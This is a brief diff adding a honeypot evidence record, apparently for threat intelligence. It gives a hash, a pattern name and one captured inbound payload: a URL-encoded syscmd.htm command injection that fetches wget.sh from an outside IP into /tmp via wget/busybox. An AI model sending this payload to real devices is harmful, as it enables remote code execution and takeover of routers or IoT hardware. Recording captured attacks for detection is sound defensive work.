@@ -1,0 +1,5 @@
+SHA256: 60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079
+Pattern: syscmd.htm command execution
+Evidence source: T-Pot inbound payload
+
+submit-url=%2Fsyscmd.htm&sysCmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget
